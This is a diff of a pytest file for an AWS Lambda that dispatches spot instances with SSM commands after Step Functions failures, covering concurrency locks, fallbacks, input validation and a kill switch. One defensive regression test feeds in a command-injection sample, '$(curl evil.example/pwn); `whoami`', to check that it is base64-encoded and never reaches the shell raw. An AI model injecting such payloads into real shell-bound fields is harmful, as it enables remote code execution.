@@ -1,19 +1,22 @@
-"""Unit tests for the synchronous CI-failure -> ci-watch-spot dispatcher.
+"""Unit tests for the synchronous SF-failure -> sf-watch-spot dispatcher.
 
 Hermetic: ``nousergon_lib.ec2_spot`` and ``boto3`` are stubbed in sys.modules
-BEFORE importing index (mirrors scheduled-groom-dispatcher/test_handler.py).
+BEFORE importing index (mirrors ci-watch-dispatcher/test_handler.py — index.py
+itself imports the REAL nousergon_lib.spot_dispatch, which resolves its own
+`from nousergon_lib import ec2_spot` / `import boto3` against these stubs).
 Validates: a valid event launches a spot box and fires an async SSM command;
 the on-demand fallback on spot capacity exhaustion; a total launch failure
 (spot AND on-demand exhausted) returns a clean launched:false rather than
-raising; the (repo, sha)-scoped concurrency lock (narrower than groom's
-per-tier lock — two different shas on the same repo must NOT block each
-other); a post-launch SSM-send failure terminates the box and returns
-launched:false; a malformed event returns launched:false rather than raising;
-the kill-switch short-circuit.
+raising; the (cadence_slug, pipeline_name, run_date)-scoped concurrency lock;
+a post-launch SSM-send failure terminates the box and returns launched:false;
+a malformed event returns launched:false rather than raising; the kill-switch
+short-circuit; and the cause-field base64 command-injection guard.
 """
 
 from __future__ import annotations
 
+import base64
+import importlib
 import os
 import sys
 import types
@@ -54,8 +57,8 @@ class _FakeEc2:
     def __init__(self, running_instances=None):
         self.terminated = []
         self.tags_created = []
-        # {(repo, sha) -> [instance_ids]} already "live" for the concurrency
-        # guard's describe_instances check to find.
+        # {(cadence_slug, pipeline_name, run_date) -> [instance_ids]} already
+        # "live" for the concurrency guard's describe_instances check to find.
         self._running_instances = dict(running_instances or {})
 
     def get_waiter(self, name):
@@ -71,9 +74,10 @@ class _FakeEc2:
 
     def describe_instances(self, Filters):  # noqa: N803 — boto3 kwarg name
         by_name = {f["Name"]: f["Values"] for f in Filters}
-        repo = by_name.get("tag:ci-watch-repo", [None])[0]
-        sha = by_name.get("tag:ci-watch-sha", [None])[0]
-        ids = self._running_instances.get((repo, sha), [])
+        cadence = by_name.get("tag:sf-watch-cadence", [None])[0]
+        pipeline = by_name.get("tag:sf-watch-pipeline", [None])[0]
+        run_date = by_name.get("tag:sf-watch-run-date", [None])[0]
+        ids = self._running_instances.get((cadence, pipeline, run_date), [])
         return {"Reservations": [{"Instances": [{"InstanceId": i} for i in ids]}]} if ids else {"Reservations": []}
 
 
@@ -100,21 +104,16 @@ def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None):
     _install_stubs(launch_impl, clients)
     # Derive the stub requirement from index.py's live import graph and fail
     # loud on drift here, rather than as a ModuleNotFoundError at deploy time
-    # (config#1746 pattern — see scheduled-groom-dispatcher/test_handler.py).
+    # (config#1746 pattern — see ci-watch-dispatcher/test_handler.py).
     from _shared.hermetic_import_guard import assert_hermetic_imports_satisfied
 
     assert_hermetic_imports_satisfied(__file__)
-    import importlib
-
     # nousergon_lib.spot_dispatch (config#2106) sits between index.py and the
     # stubbed nousergon_lib.ec2_spot/boto3 above. Its own `from nousergon_lib
     # import ec2_spot` / `import boto3` bindings are resolved once at ITS
-    # import time — if it's already cached in sys.modules from a prior test's
-    # stub, `import index` + reload(index) alone would NOT re-resolve those
-    # bindings (index just re-fetches the same, stale spot_dispatch module
-    # object). Reload spot_dispatch in place first (never a bare del+reimport
-    # — see reference_pytest_del_reimport_vs_reload_fixture_corruption_260709)
-    # so every test sees the CURRENT stub.
+    # import time — reload it in place (never a bare del+reimport — see
+    # reference_pytest_del_reimport_vs_reload_fixture_corruption_260709) so
+    # every test sees the CURRENT stub.
     if "nousergon_lib.spot_dispatch" in sys.modules:
         importlib.reload(sys.modules["nousergon_lib.spot_dispatch"])
     else:
@@ -130,12 +129,15 @@ def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None):
 
 def _event(**overrides):
     base = {
-        "repo": "nousergon/alpha-engine-config",
-        "sha": "abc1234def5678900000000000000000000abcd",
-        "run_id": "123456789",
-        "run_url": "https://github.com/nousergon/alpha-engine-config/actions/runs/123456789",
-        "workflow": "Fleet CI",
-        "branch": "main",
+        "pipeline_name": "ne-weekly-freshness-pipeline",
+        "cadence_slug": "saturday",
+        "state_machine_arn": "arn:aws:states:us-east-1:711398986525:stateMachine:ne-weekly-freshness-pipeline",
+        "execution_arn": "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1",
+        "run_date": "2026-07-11",
+        "failed_state": "RationaleClustering",
+        "cause": "States.Timeout",
+        "watch_log_key": "consolidated/saturday_sf_watch/2026-07-11.json",
+        "is_preflight": "false",
     }
     base.update(overrides)
     return base
@@ -150,40 +152,68 @@ def test_valid_event_launches_spot_and_sends_async_ssm(monkeypatch):
         calls["tag_name"] = kw.get("tag_name")
         return "i-abc"
 
-    idx = _load(monkeypatch, launch_impl=_launch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
+    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
     out = idx.handler(_event(), None)
     assert out["launched"] is True
     assert out["reason"] == "launched"
     assert out["instance_id"] == "i-abc"
     assert out["market"] == "spot"
     assert out["command_id"] == "cmd-123"
-    assert out["repo"] == "nousergon/alpha-engine-config"
+    assert out["pipeline_name"] == "ne-weekly-freshness-pipeline"
+    assert out["cadence_slug"] == "saturday"
+    assert out["run_date"] == "2026-07-11"
     assert calls["spot"] is True
-    assert calls["profile"] == "alpha-engine-ci-watch-executor-profile"
-    assert calls["tag_name"] == "alpha-engine-ci-watch-spot"
-    # The instance is tagged with its repo+sha for the concurrency guard.
+    assert calls["profile"] == "alpha-engine-sf-watch-executor-profile"
+    assert calls["tag_name"] == "alpha-engine-sf-watch-spot"
+    # The instance is tagged with its cadence/pipeline/run_date for the
+    # concurrency guard AND the fleet spot-orphan-reaper's completion check.
     assert idx._test_ec2.tags_created == [
-        (["i-abc"], [{"Key": "ci-watch-repo", "Value": "nousergon/alpha-engine-config"},
-                     {"Key": "ci-watch-sha", "Value": "abc1234def5678900000000000000000000abcd"}])
+        (["i-abc"], [
+            {"Key": "sf-watch-cadence", "Value": "saturday"},
+            {"Key": "sf-watch-pipeline", "Value": "ne-weekly-freshness-pipeline"},
+            {"Key": "sf-watch-run-date", "Value": "2026-07-11"},
+        ])
     ]
     sent = idx._test_ssm.sent[0]
     cmd = sent["Parameters"]["commands"][0]
-    # ci_watch_spot_bootstrap.sh (alpha-engine-config) takes its CI fields as
-    # CLI FLAGS, not env vars — assert the actual invocation shape, not an
-    # `export CI_WATCH_*` form the bootstrap script never reads.
-    assert "exec bash infrastructure/ci_watch_spot_bootstrap.sh" in cmd
-    assert '--ci-repo "nousergon/alpha-engine-config"' in cmd
-    assert '--ci-sha "abc1234def5678900000000000000000000abcd"' in cmd
-    assert '--ci-run-url "https://github.com' in cmd
+    # sf_watch_spot_bootstrap.sh (alpha-engine-config) takes its SF fields as
+    # CLI FLAGS, not env vars.
+    assert "exec bash infrastructure/sf_watch_spot_bootstrap.sh" in cmd
+    assert '--pipeline "ne-weekly-freshness-pipeline"' in cmd
+    assert '--cadence-slug "saturday"' in cmd
+    assert '--execution-arn "arn:aws:states:us-east-1:711398986525:execution:ne-weekly-freshness-pipeline:run-1"' in cmd
+    assert '--run-date "2026-07-11"' in cmd
+    assert '--failed-state "RationaleClustering"' in cmd
+    assert '--watch-log-key "consolidated/saturday_sf_watch/2026-07-11.json"' in cmd
+    assert '--is-preflight "false"' in cmd
     assert "export HOME=/root" in cmd
+    # cause is base64-encoded, never raw, in the constructed shell command.
+    expected_b64 = base64.b64encode(b"States.Timeout").decode("ascii")
+    assert f'--cause-b64 "{expected_b64}"' in cmd
+    assert "States.Timeout" not in cmd
     # run_token is NOT threaded into the box (no in-box consumer — the
-    # completion marker keys directly on repo+sha) — only a Lambda-side
-    # correlation id, surfaced via the SSM Comment field instead.
+    # completion marker keys directly on cadence/pipeline/run_date) — only a
+    # Lambda-side correlation id, surfaced via the SSM Comment field instead.
     assert "run_token" not in cmd
-    assert "CI_WATCH_RUN_TOKEN" not in cmd
     assert "token" in sent["Comment"]
 
     assert sent["Parameters"]["executionTimeout"] == [str(idx.MAX_RUNTIME_SECONDS)]
+
+
+def test_cause_with_shell_metacharacters_is_safely_base64_encoded(monkeypatch):
+    """Security regression guard: a `cause` string containing quotes/`$`/
+    backticks must NEVER be interpolated raw into the constructed SSM shell
+    command — only its base64 encoding may appear."""
+    dangerous_cause = '$(curl evil.example/pwn); `whoami`; "quoted"; \' single \''
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
+    out = idx.handler(_event(cause=dangerous_cause), None)
+    assert out["launched"] is True
+    cmd = idx._test_ssm.sent[0]["Parameters"]["commands"][0]
+    assert dangerous_cause not in cmd
+    assert "curl evil.example" not in cmd
+    assert "whoami" not in cmd
+    expected_b64 = base64.b64encode(dangerous_cause.encode("utf-8")).decode("ascii")
+    assert f'--cause-b64 "{expected_b64}"' in cmd
 
 
 def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
@@ -195,7 +225,7 @@ def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
             raise _SpotCapacityExhausted("no capacity in any pool")
         return "i-ondemand"
 
-    idx = _load(monkeypatch, launch_impl=_launch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
+    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
     out = idx.handler(_event(), None)
     assert out["launched"] is True
     assert out["market"] == "on-demand"
@@ -204,13 +234,13 @@ def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
 
 
 def test_total_launch_exhaustion_returns_clean_false_not_raise(monkeypatch):
-    # SYNCHRONOUS contract (index.py docstring): unlike groom's fail-loud
-    # posture, spot AND on-demand both exhausted must be a clean return, not
-    # an exception — the GHA caller needs a JSON verdict to branch on.
+    # SYNCHRONOUS contract (index.py docstring): spot AND on-demand both
+    # exhausted must be a clean return, not an exception — the GHA caller
+    # needs a JSON verdict to branch on.
     def _launch(types_, subnets, **kw):
         raise _SpotCapacityExhausted("exhausted everywhere")
 
-    idx = _load(monkeypatch, launch_impl=_launch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
+    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
     out = idx.handler(_event(), None)
     assert out["launched"] is False
     assert out["reason"] == "launch_failed"
@@ -222,13 +252,13 @@ def test_non_capacity_launch_error_returns_clean_false(monkeypatch):
     def _launch(types_, subnets, **kw):
         raise _SpotLaunchError("RunInstances denied")
 
-    idx = _load(monkeypatch, launch_impl=_launch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
+    idx = _load(monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
     out = idx.handler(_event(), None)
     assert out["launched"] is False
     assert out["reason"] == "launch_failed"
 
 
-def test_concurrency_skip_when_same_repo_and_sha_already_running(monkeypatch):
+def test_concurrency_skip_when_same_cadence_pipeline_run_date_already_running(monkeypatch):
     launched = []
 
     def _launch(types_, subnets, **kw):
@@ -236,9 +266,9 @@ def test_concurrency_skip_when_same_repo_and_sha_already_running(monkeypatch):
         return "i-new"
 
     idx = _load(
-        monkeypatch, launch_impl=_launch, env={"CI_WATCH_DISPATCH_ENABLED": "true"},
+        monkeypatch, launch_impl=_launch, env={"SF_WATCH_DISPATCH_ENABLED": "true"},
         running_instances={
-            ("nousergon/alpha-engine-config", "abc1234def5678900000000000000000000abcd"): ["i-already-running"],
+            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-11"): ["i-already-running"],
         },
     )
     out = idx.handler(_event(), None)
@@ -248,28 +278,28 @@ def test_concurrency_skip_when_same_repo_and_sha_already_running(monkeypatch):
     assert launched == []  # never even attempted a spot launch — zero spend
 
 
-def test_different_sha_same_repo_is_not_blocked(monkeypatch):
-    # This is the whole point of the (repo, sha) granularity — a bare-repo
-    # lock (like groom's per-tier lock) would wrongly starve a second commit's
-    # independent CI failure on the same repo.
+def test_different_run_date_same_pipeline_cadence_is_not_blocked(monkeypatch):
+    # This is the whole point of the full (cadence, pipeline, run_date)
+    # granularity — a partial-key lock would wrongly starve a second
+    # independent failure for a different run_date.
     idx = _load(
         monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
-        env={"CI_WATCH_DISPATCH_ENABLED": "true"},
+        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
         running_instances={
-            ("nousergon/alpha-engine-config", "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"): ["i-other-sha"],
+            ("saturday", "ne-weekly-freshness-pipeline", "2026-07-04"): ["i-other-date"],
         },
     )
-    out = idx.handler(_event(sha="abc1234def5678900000000000000000000abcd"), None)
+    out = idx.handler(_event(run_date="2026-07-11"), None)
     assert out["launched"] is True
     assert out["instance_id"] == "i-new"
 
 
-def test_different_repo_same_sha_is_not_blocked(monkeypatch):
+def test_different_pipeline_same_cadence_and_date_is_not_blocked(monkeypatch):
     idx = _load(
         monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
-        env={"CI_WATCH_DISPATCH_ENABLED": "true"},
+        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
         running_instances={
-            ("nousergon/other-repo", "abc1234def5678900000000000000000000abcd"): ["i-other-repo"],
+            ("saturday", "ne-preopen-trading-pipeline", "2026-07-11"): ["i-other-pipeline"],
         },
     )
     out = idx.handler(_event(), None)
@@ -279,7 +309,7 @@ def test_different_repo_same_sha_is_not_blocked(monkeypatch):
 def test_concurrency_check_fails_safe_and_still_launches(monkeypatch):
     idx = _load(
         monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
-        env={"CI_WATCH_DISPATCH_ENABLED": "true"},
+        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
     )
 
     def _boom(Filters):  # noqa: N803 — boto3 kwarg name
@@ -288,7 +318,7 @@ def test_concurrency_check_fails_safe_and_still_launches(monkeypatch):
     idx._test_ec2.describe_instances = _boom
     out = idx.handler(_event(), None)
     # A broken check must never block a launch — optimization, not a
-    # correctness gate (mirrors groom's fail-safe posture on its own guard).
+    # correctness gate.
     assert out["launched"] is True
 
 
@@ -296,7 +326,7 @@ def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeyp
     idx = _load(
         monkeypatch,
         launch_impl=lambda types_, subnets, **kw: "i-orphan",  # noqa: E731
-        env={"CI_WATCH_DISPATCH_ENABLED": "true"},
+        env={"SF_WATCH_DISPATCH_ENABLED": "true"},
     )
 
     def _boom_send(**kw):
@@ -312,35 +342,44 @@ def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeyp
     assert idx._test_ec2.terminated == ["i-orphan"]
 
 
-def test_malformed_event_returns_clean_false_not_raise(monkeypatch):
-    idx = _load(monkeypatch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
-    out = idx.handler(_event(sha="not-a-sha"), None)
+def test_malformed_run_date_returns_clean_false_not_raise(monkeypatch):
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
+    out = idx.handler(_event(run_date="not-a-date"), None)
     assert out["launched"] is False
     assert out["reason"] == "invalid_event"
     assert idx._test_ssm.sent == []
 
 
-def test_missing_field_returns_clean_false(monkeypatch):
-    idx = _load(monkeypatch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
+def test_malformed_execution_arn_returns_clean_false(monkeypatch):
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
+    out = idx.handler(_event(execution_arn="not-an-arn"), None)
+    assert out["launched"] is False
+    assert out["reason"] == "invalid_event"
+
+
+def test_missing_pipeline_name_returns_clean_false(monkeypatch):
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
     event = _event()
-    del event["repo"]
+    del event["pipeline_name"]
     out = idx.handler(event, None)
     assert out["launched"] is False
     assert out["reason"] == "invalid_event"
 
 
-def test_run_url_with_dollar_sign_rejected(monkeypatch):
-    # Under `set -u` in the double-quoted prelude export, a `$`-bearing
-    # run_url could expand as a positional param and abort the prelude
-    # (same gotcha groom's own run_url note documents).
-    idx = _load(monkeypatch, env={"CI_WATCH_DISPATCH_ENABLED": "true"})
-    out = idx.handler(_event(run_url="https://example.com/$2Fbad"), None)
-    assert out["launched"] is False
-    assert out["reason"] == "invalid_event"
+def test_missing_optional_fields_still_launches(monkeypatch):
+    # failed_state/cause/watch_log_key/state_machine_arn/is_preflight are all
+    # optional — only pipeline_name/cadence_slug/execution_arn/run_date are
+    # required (mirrors sf_watch_spot_bootstrap.sh's own FATAL check).
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "true"})
+    event = _event()
+    for optional in ("state_machine_arn", "failed_state", "cause", "watch_log_key", "is_preflight"):
+        del event[optional]
+    out = idx.handler(event, None)
+    assert out["launched"] is True
 
 
 def test_disabled_flag_short_circuits(monkeypatch):
-    idx = _load(monkeypatch, env={"CI_WATCH_DISPATCH_ENABLED": "false"})
+    idx = _load(monkeypatch, env={"SF_WATCH_DISPATCH_ENABLED": "false"})
     out = idx.handler(_event(), None)
     assert out["launched"] is False
     assert out["reason"] == "disabled"
